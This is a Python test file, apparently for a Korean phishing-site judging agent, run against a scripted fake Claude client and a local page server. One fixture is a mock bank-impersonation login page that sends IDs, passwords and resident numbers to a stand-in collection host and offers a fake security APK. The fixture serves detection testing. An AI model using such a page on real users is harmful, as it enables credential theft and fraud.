"""판정 에이전트 오프라인 검사 — Claude 없이 도구·가드레일 확인

    python test_agent.py

가짜 Claude(ScriptedClient)가 정해진 순서로 도구 호출. 검사 항목 셋:
 ① 도구 반환값 정확성 (사칭 페이지 → 브랜드 불일치·비밀번호 폼·JS 리다이렉트 추적)
 ② 근거 검증 — 도구 결과에 있는 근거만 고위험 인정
 ③ 예산 — 도구 MAX_TOOL_CALLS(3)번에서 final_verdict 강제
"""

import http.server
import json
import os
import tempfile
import threading
import time
from types import SimpleNamespace

import judge_agent as agent

# ── 가짜 페이지 서버 ──────────────────────────────────────────────────────────

PAGES = {
    # 1홉: JS 리다이렉트 껍데기 (예전 코드가 "본문 없음"으로 끝나던 경우)
    "/go": "<html><head><script>location.replace('/hop2')</script></head><body></body></html>",
    # 2홉: meta refresh
    "/hop2": "<html><head><meta http-equiv='refresh' content='0;url=/secure'></head><body></body></html>",
    # 3홉: 사칭 로그인 — JS 렌더링 흉내로 본문 거의 없음, 폼·제목만 HTML에 잔존
    "/secure": """<html><head><title>KB국민은행 인터넷뱅킹 로그인</title>
        <script src="https://cdn.evil-tracker.xyz/a.js"></script></head>
        <body><div id="app"></div>
        <form action="https://collect.evil-data.ru/login" method="post">
          <input name="userId" placeholder="아이디"><input type="password" name="pw" placeholder="비밀번호">
          <input name="rrn" placeholder="주민등록번호"><button>로그인</button></form>
        <a href="/app/kbstar_security.apk">보안앱 설치</a></body></html>""",
    # 자바스크립트로 그리는 빈 껍데기 — <title>조차 없음 (실측: axa.co.kr·hi.co.kr·kyobo.com)
    "/jsonly": "<html><head><script src='/app.js'></script></head><body><div id='root'></div></body></html>",
    # 평범한 쇼핑몰
    "/shop": "<html><head><title>동네 반찬가게</title></head><body>" + "오늘의 반찬 특가 안내. 배송은 2~3일 걸립니다. 사업자등록번호 123-45-67890. " * 20 + "</body></html>",
}


class _H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/slow"):
            # 헤더는 바로, 본문은 1초마다 조금씩 — 소켓 시한(3.5초)으로는 안 끊기는 페이지
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            for _ in range(20):
                try:
                    self.wfile.write(b"<p>loading</p>" * 10)
                    self.wfile.flush()
                except Exception:
                    return
                time.sleep(1.0)
            return
        body = PAGES.get(self.path.split("?")[0])
        if body is None:
            self.send_response(404); self.end_headers(); return
        data = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *a):  # 조용히
        pass


def serve() -> str:
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return f"http://127.0.0.1:{srv.server_address[1]}"


# ── 가짜 Claude ───────────────────────────────────────────────────────────────


class ScriptedClient:
    """messages.create 호출마다 대본의 다음 도구 호출"""

    def __init__(self, script):
        self.script = list(script)
        self.calls = []
        self.messages = self

    def create(self, **kw):
        self.calls.append(kw)
        forced = kw["tool_choice"].get("name")
        if forced == "final_verdict" or not self.script:
            # 예산 소진으로 강제됐거나 대본 소진 → 지금까지 본 것으로 판정하는 시늉
            return self._use("final_verdict", {
                "risk": "MEDIUM", "type": "unverifiable",
                "reason": "예산 안에 다 확인하지 못했어요.", "advice": "돌아가는 것을 권해요.", "evidence": "",
            })
        name, args = self.script.pop(0)
        return self._use(name, args)

    @staticmethod
    def _use(name, args):
        blk = SimpleNamespace(type="tool_use", id=f"tu_{name}_{time.monotonic_ns()}", name=name, input=args)
        return SimpleNamespace(content=[blk], stop_reason="tool_use")

    def stream(self, **kw):
        """실제 SDK처럼 이벤트를 흘리는 컨텍스트 — 도구 입력 JSON을 조각내어 input_json_delta로"""
        msg = self.create(**kw)
        return _FakeStream(msg)


class _FakeStream:
    def __init__(self, msg):
        self.msg = msg
        self.closed = False
        self.seen_at_risk = None

    def __enter__(self):
        return self

    def __exit__(self, *a):
        self.closed = True

    def __iter__(self):
        blk = self.msg.content[0]
        yield SimpleNamespace(type="content_block_start", content_block=SimpleNamespace(type="tool_use", name=blk.name))
        text = json.dumps(blk.input, ensure_ascii=False)
        for i in range(0, len(text), 7):
            yield SimpleNamespace(type="content_block_delta",
                                  delta=SimpleNamespace(type="input_json_delta", partial_json=text[i:i + 7]))
        yield SimpleNamespace(type="content_block_stop")

    def close(self):
        self.closed = True

    def get_final_message(self):
        return self.msg


def deps(tmp):
    return agent.Deps(
        db_path=os.path.join(tmp, "t.db"),
        blocked_by=lambda url: "ut1-phishing" if "kb-star.top" in url else None,
        cache_lookup=lambda site: None,
    )


def agent_tools(run):
    """prefetch 단계를 뺀, Claude가 **추가로** 고른 도구들"""
    return [t["tool"] for t in run.trace if t.get("phase") == "agent" and t["tool"] != "llm"]


def main():
    base = serve()
    tmp = tempfile.mkdtemp()
    ok = 0
    # 네트워크 없이 실행 — RDAP 실제 호출은 맨 아래 ④에서만
    real_age = agent.domain_age_days
    agent.domain_age_days = lambda site, db, wait_s=0.0: (None, "테스트: 조회 안 함")

    # ① 도구 — 리다이렉트 3홉 추적 + 페이지 신호
    r = agent.fetch_chain(f"{base}/go")
    assert r["final_url"].endswith("/secure"), r["chain"]
    assert len(r["chain"]) == 3, r["chain"]
    sig = agent.page_signals(r["html"], "https://kb-star.top/secure")
    assert sig["password_field"] and sig["asks_rrn"], sig
    assert sig["forms"][0]["external_action"] is True
    assert "국민은행" in sig["brand_mentions"], sig["brand_mentions"]
    assert sig["brand_domain_mismatch"] and "kbstar.com" in sig["brand_domain_mismatch"][0]["official"]
    assert sig["apk_links"], sig
    assert sig["js_only"] is True
    assert agent.official_domains_of("KB 국민은행") == ["kbstar.com", "kbcard.com", "kbfg.com"]
    assert agent.official_domains_of("듣보잡") == []
    assert agent.same_site("obank.kbstar.com", "kbstar.com") and not agent.same_site("kb-star.top", "kbstar.com")
    print("① 도구: 리다이렉트 3홉 → 사칭 신호(비밀번호·주민번호 폼·브랜드 불일치·APK) ✓"); ok += 1

    # ② 에이전트 루프 — 사칭 사례. 근거가 도구 결과에 있으므로 HIGH 유지
    script = [
        ("official_domain_of", {"brand": "KB국민은행"}),
        ("final_verdict", {
            "risk": "HIGH", "type": "impersonation",
            "reason": "국민은행을 사칭한 가짜 로그인 페이지예요.", "advice": "아이디와 비밀번호를 넣지 말고 돌아가세요.",
            "evidence": "KB국민은행 인터넷뱅킹 로그인 / official_domains kbstar.com / password",
        }),
    ]
    run = agent.run_agent(ScriptedClient(script), "fake", "CRITERIA", f"{base}/go", None, deps(tmp))
    assert run.verdict["risk"] == "HIGH", run.verdict
    pre = [t["tool"] for t in run.trace if t.get("phase") == "pre"]
    assert {"fetch_page", "page_signals", "check_blocklist", "lookup_cache", "domain_age"} <= set(pre), pre
    assert agent_tools(run) == ["official_domain_of"], run.trace
    assert run.final_url.endswith("/secure")
    assert run.llm_calls == 2, run.llm_calls
    print(f"② 사칭: 미리 모음 {pre} → 추가 도구 {agent_tools(run)} → HIGH ✓"); ok += 1

    # ② 근거 검증 — 도구 결과에 없는 근거로 HIGH → MEDIUM
    script = [
        ("final_verdict", {
            "risk": "HIGH", "type": "credentials",
            "reason": "카드번호를 요구해요.", "advice": "돌아가세요.",
            # 페이지에 없는 말. 숫자 없이 — 근거 검증이 숫자 토큰을 따로 보는데 가짜 서버 포트(예: 61634)에
            # "16"이 섞이면 우연히 통과(실측: 포트에 따라 간헐 실패)
            "evidence": "카드번호와 보안코드를 입력하세요",
        }),
    ]
    run = agent.run_agent(ScriptedClient(script), "fake", "CRITERIA", f"{base}/shop", None, deps(tmp))
    assert run.verdict["risk"] == "MEDIUM", run.verdict
    print("② 근거 없는 HIGH → MEDIUM 강등 ✓"); ok += 1

    # ② 평범한 쇼핑몰 — fetch 1번에 LOW
    script = [
        ("final_verdict", {"risk": "LOW", "type": "none", "reason": "평범한 가게 페이지예요.", "advice": "그대로 보셔도 돼요.", "evidence": "오늘의 반찬 특가 안내"}),
    ]
    t0 = time.monotonic()
    run = agent.run_agent(ScriptedClient(script), "fake", "CRITERIA", f"{base}/shop", None, deps(tmp))
    assert run.verdict["risk"] == "LOW" and run.tool_calls == 0 and run.llm_calls == 1, (run.verdict, run.tool_calls, run.llm_calls)
    print(f"② 쇼핑몰: 미리 모음 → Claude 왕복 1번 → LOW ({time.monotonic() - t0:.2f}s) ✓"); ok += 1

    # ③ 예산 — 도구 무한 호출 대본. MAX_TOOL_CALLS(3)번에서 final_verdict 강제
    script = [("check_blocklist", {"host": f"h{i}.example"}) for i in range(10)]
    run = agent.run_agent(ScriptedClient(script), "fake", "CRITERIA", f"{base}/shop", None, deps(tmp))
    assert run.tool_calls == agent.MAX_TOOL_CALLS, run.tool_calls
    assert run.verdict["risk"] == "MEDIUM"
    print(f"③ 예산: 도구 {run.tool_calls}번에서 강제 종료 ✓"); ok += 1

    # ③ 차단 목록 도구
    run = agent.run_agent(ScriptedClient([("check_blocklist", {"host": "kb-star.top"}),
                                          ("final_verdict", {"risk": "HIGH", "type": "impersonation", "reason": "r", "advice": "a",
                                                             "evidence": "ut1-phishing"})]),
                          "fake", "CRITERIA", f"{base}/shop", None, deps(tmp))
    hit = [t for t in run.trace if t["tool"] == "check_blocklist" and t["args"].get("host") == "kb-star.top"]
    assert run.verdict["risk"] == "HIGH" and hit and hit[0]["summary"] == "ut1-phishing", run.trace
    print("③ 차단 목록 도구 + 목록 이름을 근거로 인정 ✓"); ok += 1

    # (네트워크) 도메인 등록일 — rdap.org 접속 시 example.com은 1995년
    # 조회는 백그라운드 — 여기서는 시험이니 HTTP 타임아웃만큼 기다려 기록까지 확인
    agent.domain_age_days = real_age
    assert agent.domain_age_days("naver.co.kr", deps(tmp).db_path)[0] is None   # .kr — 조회 없이 모름
    days, note = agent.domain_age_days("example.com", deps(tmp).db_path, wait_s=agent.RDAP_BG_TIMEOUT_S + 1)
    if days is not None:
        assert days > 365 * 20, (days, note)
        days2, note2 = agent.domain_age_days("example.com", deps(tmp).db_path)
        assert "캐시" in note2, note2
        print(f"④ domain_age(example.com) = {days}일, 두 번째는 캐시 ✓"); ok += 1
    else:
        print(f"④ domain_age: 네트워크 없음/실패 → '{note}' (모름으로 처리됨) — 건너뜀")
    agent.domain_age_days = lambda site, db, wait_s=0.0: (None, "테스트: 조회 안 함")

    # ⑤ 자바스크립트로 그리는 페이지 — 도착 도메인이 공식 표에 있으면 왕복 한 번에 LOW
    # 가짜 서버는 127.0.0.1이라 표 대조가 불가 → 도메인 판별·표를 잠시 바꿔 끼움
    real_looks, real_brands = agent._looks_like_domain, agent.BRANDS
    agent._looks_like_domain = lambda q: real_looks(q) or q.startswith("127.0.0.1")
    agent.BRANDS = real_brands + [(("시험회사",), ("127.0.0.1",))]
    try:
        script = [("final_verdict", {"risk": "LOW", "type": "none", "reason": "시험회사 공식 사이트예요.",
                                     "advice": "그대로 보셔도 돼요.", "evidence": "127.0.0.1은(는) 시험회사의 공식 도메인이다"})]
        client = ScriptedClient(script)
        run = agent.run_agent(client, "fake", "CRITERIA", f"{base}/jsonly", None, deps(tmp))
        pre = [t for t in run.trace if t.get("phase") == "pre" and t["tool"] == "official_domain_of"]
        assert pre and pre[0]["summary"] == "시험회사 공식", run.trace
        first = client.calls[0]["messages"][0]["content"]
        assert "자바스크립트로 그리기 때문" in first and "공식 도메인 표에서 확인됐으니 저위험" in first, first
        assert run.verdict["risk"] == "LOW" and run.llm_calls == 1 and agent_tools(run) == [], run.trace
        print("⑤ JS 페이지 + 공식 도메인: 표를 미리 조회 → 왕복 1번 → LOW ✓"); ok += 1

        # 본문을 못 받은 경우(403·404)도 도착 도메인이 공식 표에 있으면 저위험 힌트 — 쿠팡이 Azure IP를
        # 403으로 막아 "확인 불가"가 되던 건(실측 2026-08-24)
        client = ScriptedClient([("final_verdict", {"risk": "LOW", "type": "none", "reason": "시험회사 공식 사이트예요.",
                                                    "advice": "그대로 보셔도 돼요.", "evidence": "127.0.0.1은(는) 시험회사의 공식 도메인이다"})])
        run = agent.run_agent(client, "fake", "CRITERIA", f"{base}/nope-404", None, deps(tmp))
        first = client.calls[0]["messages"][0]["content"]
        assert "페이지를 받지 못했다(http 404)" in first and "공식 도메인 표에서 확인됐으니 저위험" in first, first
        assert run.verdict["risk"] == "LOW", run.verdict
        print("⑤ 404(접속 차단)도 공식 도메인이면 저위험 힌트 ✓"); ok += 1

        # 표에 없는 도메인으로 물으면 이름 대조로 흘러가지 않는다 (srchdiscounts.com → "nts" 별칭 사고)
        script = [("official_domain_of", {"brand": "srchdiscounts.com"}),
                  ("official_domain_of", {"brand": "www.axa.co.kr"}),
                  ("final_verdict", {"risk": "MEDIUM", "type": "unverifiable", "reason": "확인하지 못했어요.",
                                     "advice": "돌아가세요.", "evidence": ""})]
        run = agent.run_agent(ScriptedClient(script), "fake", "CRITERIA", f"{base}/shop", None, deps(tmp))
        q = {t["args"]["brand"]: json.loads(t["summary"]) if t["summary"].startswith("{") else t["summary"]
             for t in run.trace if t.get("phase") == "agent" and t["tool"] == "official_domain_of"}
        assert q["srchdiscounts.com"] == "표에 없음" and q["www.axa.co.kr"] == "AXA손해보험 공식", q
        print("⑤ 도메인으로 물으면 도메인 대조에서 끝남 (별칭 부분 일치로 안 흘러감) ✓"); ok += 1
    finally:
        agent._looks_like_domain, agent.BRANDS = real_looks, real_brands

    # ⑥ 꼬리 — 본문을 1초마다 조금씩 흘리는 페이지. 예전엔 prefetch가 스레드 종료를 기다려 20초+
    script = [("final_verdict", {"risk": "MEDIUM", "type": "unverifiable", "reason": "확인하지 못했어요.",
                                 "advice": "돌아가세요.", "evidence": ""})]
    t0 = time.monotonic()
    run = agent.run_agent(ScriptedClient(script), "fake", "CRITERIA", f"{base}/slow", None, deps(tmp))
    took = time.monotonic() - t0
    assert took < agent.WALL_BUDGET_S, took
    assert run.llm_calls == 1, run.llm_calls
    print(f"⑥ 느린 페이지(20초 스트리밍)도 예산 안에 종료 ({took:.1f}s < {agent.WALL_BUDGET_S}s) ✓"); ok += 1

    # ⑦ oneshot — 도구 대본이 있어도 첫 호출에서 final_verdict 강제, 도구 목록은 final만,
    #   본문이 언급한 브랜드의 공식 도메인을 미리 조회해 첫 질문에 포함
    script = [("official_domain_of", {"brand": "KB국민은행"}), ("domain_age", {"host": "kb-star.top"})]
    client = ScriptedClient(script)
    run = agent.run_agent(client, "fake", "CRITERIA", f"{base}/go", None, deps(tmp), oneshot=True)
    assert run.llm_calls == 1 and run.tool_calls == 0, (run.llm_calls, run.tool_calls)
    call = client.calls[0]
    assert call["tool_choice"] == {"type": "tool", "name": "final_verdict"}, call["tool_choice"]
    assert [t["name"] for t in call["tools"]] == ["final_verdict"], [t["name"] for t in call["tools"]]
    assert call["tools"][0].get("eager_input_streaming") is True
    brands = [t for t in run.trace if t["tool"] == "official_domain_of" and t["args"].get("brand") == "국민은행"]
    assert brands, run.trace
    assert "official_domain_of(언급된 브랜드)" in call["messages"][0]["content"]
    assert "도구는 더 쓸 수 없다" in call["system"][0]["text"]
    print("⑦ oneshot: 왕복 1번 강제 · 도구 목록 final만 · 브랜드 공식 도메인 미리 포함 ✓"); ok += 1

    # ⑧ 스트리밍 선행 통보 — final_verdict 입력 JSON에서 risk가 읽히는 즉시 on_early(risk, final_url)
    early = []
    script = [("final_verdict", {"risk": "LOW", "type": "none", "reason": "평범한 가게 페이지예요.",
                                 "advice": "그대로 보셔도 돼요.", "evidence": "오늘의 반찬 특가 안내"})]
    run = agent.run_agent(ScriptedClient(script), "fake", "CRITERIA", f"{base}/shop", None, deps(tmp),
                          on_early=lambda risk, fu: early.append((risk, fu)))
    assert early == [("LOW", f"{base}/shop")], early
    assert run.verdict["risk"] == "LOW" and run.llm_calls == 1
    # on_early가 터져도 판정은 멀쩡
    run = agent.run_agent(ScriptedClient(list(script)), "fake", "CRITERIA", f"{base}/shop", None, deps(tmp),
                          on_early=lambda risk, fu: 1 / 0)
    assert run.verdict["risk"] == "LOW"
    print("⑧ 스트리밍: risk가 읽히는 즉시 on_early(LOW, 도착지) · 통보 실패에도 판정 유지 ✓"); ok += 1

    # ⑨ 스트리밍이 시작도 못 하면(연결 실패) 일반 호출로 대체 — 판정은 살고 trace에 사유
    class NoStreamClient(ScriptedClient):
        def stream(self, **kw):
            raise RuntimeError("APITimeoutError 흉내")
    early = []
    run = agent.run_agent(NoStreamClient(list(script)), "fake", "CRITERIA", f"{base}/shop", None, deps(tmp),
                          on_early=lambda risk, fu: early.append(risk))
    assert run.verdict["risk"] == "LOW" and run.llm_calls == 1 and early == [], (run.verdict, early)
    notes = [t["summary"] for t in run.trace if t["tool"] == "llm"]
    assert notes and "스트리밍 시작 실패" in notes[0], notes
    print(f"⑨ 스트리밍 시작 실패 → 일반 호출 대체 ({notes[0]}) ✓"); ok += 1

    print(f"\n{ok}개 검사 통과")


if __name__ == "__main__":
    main()
